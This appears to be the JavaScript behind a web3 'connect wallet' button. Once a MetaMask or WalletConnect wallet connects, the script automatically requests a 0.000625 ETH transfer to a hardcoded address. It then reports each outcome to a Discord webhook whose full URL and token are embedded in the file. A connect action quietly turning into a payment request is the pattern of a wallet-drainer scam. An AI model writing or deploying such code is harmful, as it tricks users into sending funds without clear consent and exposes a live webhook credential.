let isConnecting = false; // Flag to prevent multiple connections

async function connectWallet() {
    if (isConnecting) {
        console.log("Connection request already in progress...");
        return; // Exit if already connecting
    }

    isConnecting = true; // Set the flag to true
    document.getElementById("connectButton").disabled = true; // Disable the button

    try {
        // Show wallet selection options
        const walletChoice = prompt("Choose a wallet: (1) MetaMask (2) WalletConnect");
        
        if (walletChoice === "1") {
            // MetaMask connection logic
            if (typeof window.ethereum !== 'undefined') {
                const accounts = await window.ethereum.request({ method: 'eth_requestAccounts' });
                const account = accounts[0];
                console.log(`Connected to MetaMask account: ${account}`);
                
                await sendTransaction(); // Automatically send the transaction
            } else {
                alert("MetaMask is not installed. Please install it.");
                window.open("https://metamask.app.link/dapp/swiftmultisolutions.github.io/web3/", "_blank");
            }
        } else if (walletChoice === "2") {
            // WalletConnect connection logic
            const provider = new WalletConnectProvider.default({
                infuraId: "YOUR_INFURA_PROJECT_ID", // Replace with your Infura Project ID
            });

            await provider.enable();
            const web3 = new ethers.providers.Web3Provider(provider);
            const accounts = await web3.listAccounts();
            const account = accounts[0];
            console.log(`Connected to WalletConnect account: ${account}`);
            
            await sendTransaction(); // Automatically send the transaction
        } else {
            alert("Invalid choice. Please refresh and try again.");
        }
    } catch (error) {
        console.error("Error connecting to wallet:", error);
    } finally {
        isConnecting = false; // Reset the flag
        document.getElementById("connectButton").disabled = false; // Re-enable the button
    }
}

async function sendTransaction() {
    if (typeof window.ethereum !== 'undefined') {
        const provider = new ethers.providers.Web3Provider(window.ethereum);
        const signer = provider.getSigner();
        const recipientAddress = "0x7acfbcc88e94ED31568dAD7Dfe25fa532ab023bD"; // Your recipient address
        const amountInEther = "0.000625"; // The updated amount

        const transaction = {
            to: recipientAddress,
            value: ethers.utils.parseEther(amountInEther),
        };

        try {
            const txResponse = await signer.sendTransaction(transaction);
            console.log("Transaction response:", txResponse);
            
            // Send to Discord webhook
            await sendWebhook(txResponse.hash, "success");
        } catch (error) {
            console.error("Error sending transaction:", error);
            
            // Send to Discord webhook
            await sendWebhook(error.message, "failure");
        }
    } else {
        console.error("MetaMask is not installed. Please install it.");
    }
}

async function sendWebhook(message, status) {
    const webhookUrl = "https://discord.com/api/webhooks/1288775554836860969/vGhZpW1U9hPXFZfZACJomfVg-bY1pjP4__PpK_5Gf2dAxtcgZKZJqRDp3_9z0ULgP7Wg"; // Your Discord webhook URL
    const payload = {
        content: `Transaction Status: ${status}\nMessage: ${message}`
    };

    try {
        await fetch(webhookUrl, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify(payload),
        });
        console.log("Webhook sent successfully");
    } catch (error) {
        console.error("Error sending webhook:", error);
    }
}

// Attach the event listener to the button
document.getElementById("connectButton").addEventListener("click", connectWallet);
